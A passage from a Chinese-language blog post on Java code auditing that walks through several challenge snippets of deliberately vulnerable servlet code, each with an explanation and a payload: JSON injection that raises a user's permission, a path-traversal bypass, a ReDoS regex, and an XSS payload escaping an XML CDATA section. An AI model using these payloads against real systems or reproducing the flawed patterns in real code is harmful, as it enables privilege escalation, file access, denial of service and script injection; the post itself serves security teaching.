<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApiCache</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    storeJson(request, <span class="string">"/tmp/getUserInformation.json"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    loadJson();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadJson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">storeJson</span><span class="params">(HttpServletRequest request, String filename)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    JsonFactory jsonobject = <span class="keyword">new</span> JsonFactory();</span><br><span class="line">    JsonGenerator jGenerator = jfactory.createGenerator(<span class="keyword">new</span> File(filename), JsonEncoding.UTF8);</span><br><span class="line">    jGenerator.writeStartObject();</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"username"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\""</span> + request.getParameter(<span class="string">"username"</span>) + <span class="string">"\""</span>);</span><br><span class="line">    jGenerator.writeFieldName(<span class="string">"permission"</span>);</span><br><span class="line">    jGenerator.writeRawValue(<span class="string">"\"none\""</span>);</span><br><span class="line">    jGenerator.writeEndObject();</span><br><span class="line">    jGenerator.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由代码可知，存在一个记录用户信息的<code>json</code>文件，在写入过程中，参数<code>username</code>完全可控，通过特意构造的用户名可以使<code>none</code>权限改为任意权限，成功利用此漏洞还取决于<code>loadJson()</code>的实现。要成功利用此问题，<code>loadJson()</code>方法必须仅反序列化每个键的第一个匹配项，以便忽略重复键。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=foo&quot;,&quot;permission&quot;:&quot;all</span><br></pre></td></tr></table></figure>
<p>result：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;:&quot;foo&quot;,</span><br><span class="line">  &quot;permission&quot;:&quot;all&quot;,</span><br><span class="line">  &quot;permission&quot;:&quot;none&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day-8-Icicles之未授权下载"><a href="#Day-8-Icicles之未授权下载" class="headerlink" title="Day 8 - Icicles之未授权下载"></a>Day 8 - Icicles之未授权下载</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetPath</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      String icons = request.getParameter(<span class="string">"icons"</span>);</span><br><span class="line">      String filename = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line"></span><br><span class="line">      File f_icons = <span class="keyword">new</span> File(icons);</span><br><span class="line">      File f_filename = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!icons.equals(f_icons.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!filename.equals(f_filename.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"File not within target directory!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String toDir = <span class="string">"/var/myapp/data/"</span> + f_icons.getName() + <span class="string">"/"</span>;</span><br><span class="line">      File file = <span class="keyword">new</span> File(toDir, filename);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码大致逻辑为通过参数<code>icons</code>和<code>filename</code>获取文件路径与文件名，通过<code>File</code>类的<code>getName</code>函数来获取当前路径或文件的名字，有效防止目录遍历的危险，如<code>../../pass.txt</code>获取的结果为<code>pass.txt</code>，但当<code>..pass.txt</code>时仍为<code>..pass.txt</code>，因此payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icons=..&amp;filename=hacked.txt</span><br></pre></td></tr></table></figure>
<h2 id="Day-9-Chestnuts之ReDos"><a href="#Day-9-Chestnuts之ReDos" class="headerlink" title="Day 9 - Chestnuts之ReDos"></a>Day 9 - Chestnuts之ReDos</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Validator</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                        HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    response.setContentType(<span class="string">"text/plain"</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line"></span><br><span class="line">    PrintWriter out = response.getWriter();</span><br><span class="line">    <span class="keyword">if</span> (isInWhiteList(request.getParameter(<span class="string">"whitelist"</span>), request.getParameter(<span class="string">"value"</span>))) &#123;</span><br><span class="line">      out.print(<span class="string">"Value is in whitelist."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      out.print(<span class="string">"Value is not in whitelist."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    out.flush();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isInWhiteList</span><span class="params">(String whitelist, String value)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">"^["</span> + whitelist + <span class="string">"]+"</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(value);</span><br><span class="line">    <span class="keyword">return</span> matcher.matches();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中的<code>whitelist</code>参数是正则表达式模式的部分。value参数值在第22行被验证是否符合<code>whitelist</code>组成的模式。由于<code>whitelist</code>和<code>value</code>的值都是由攻击者控制的，攻击者可以注入任意正则表达式并控制该表达式的值与之相配。使用复杂的正则表达式产生CPU消耗，从而导致DoS。这种DoS的方式被称为ReDoS。</p>
<p>将连接<code>whitelist</code>作为<code>pattern</code>的”[“和”]”分别改为”(“和”)”。在前面的测试中，发现”[“和”]”，并不能导致拒绝服务攻击。将其改成”(“和”)”即可导致拒绝服务。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whitelist=([a-z])+.)+[A-Z]([a-z]&amp;value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<h2 id="Day-10-Anticipation之XML响应中的XSS"><a href="#Day-10-Anticipation之XML响应中的XSS" class="headerlink" title="Day 10 - Anticipation之XML响应中的XSS"></a>Day 10 - Anticipation之XML响应中的XSS</h2><p>漏洞代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/webdav"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">webdav</span><span class="params">(HttpServletResponse res, @RequestParam(<span class="string">"name"</span>)</span> String name) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    res.setContentType(<span class="string">"text/xml"</span>);</span><br><span class="line">    res.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">    PrintWriter pw = res.getWriter();</span><br><span class="line">    name = name.replace(<span class="string">"]]"</span>, <span class="string">""</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;person&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;name&gt;&lt;![CDATA["</span> + name.replace(<span class="string">" "</span>,<span class="string">""</span>) + <span class="string">"]]&gt;&lt;/name&gt;"</span>);</span><br><span class="line">    pw.print(<span class="string">"&lt;/person&gt;"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这段代码中，用户输入通过@RequestParam注解从GET或POST参数”name”到达函数中的name参数。且第三行响应的”Content-Type”被设置为”text/xml”。输入流是攻击者可控的，则他可以注入具有xml名称空间属性”<a href="http://www.w3.org/1999/xhtml" target="_blank" rel="noopener">http://www.w3.org/1999/xhtml”的script标签，从而执行XSS。</a></p>
<p>CDATA指的是不应由XML解析器进行解析的文本数据，因此需要将其闭合以避免注入的JS代码变成文本。然后注入带有命名空间属性<strong>“<a href="http://www.w3.org/1999/xhtml&quot;" target="_blank" rel="noopener">http://www.w3.org/1999/xhtml&quot;</a></strong>的script标签，将script标签定义为具有html属性的script标签。因此可以被浏览器当作JavaScript代码执行。payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=test] ]&gt;&lt;something%3Ascript%09xmlns%3Asomething%3D&quot;http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml&quot;&gt;alert(1)&lt;%2Fsomething%3Ascript&gt;&lt;![CDATA[</span><br></pre></td></tr></table></figure></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Sys71m</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://www.sys71m.top/2020/02/08/Java代码审计(一)/">https://www.sys71m.top/2020/02/08/Java代码审计(一)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/13/PHP代码审计(一)/"><i class="fa fa-chevron-left">  </i><span>PHP代码审计(一)</span></a></div><div class="next-post pull-right"><a href="/2019/12/29/靶机MyExpense1题解/"><span>MyExpense1靶机题解</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'https://www.sys71m.top/2020/02/08/Java代码审计(一)/';
  this.page.identifier = '2020/02/08/Java代码审计(一)/';
  this.page.title = 'Java代码审计(一)';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'sys71m' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://sys71m.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Sys71m</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>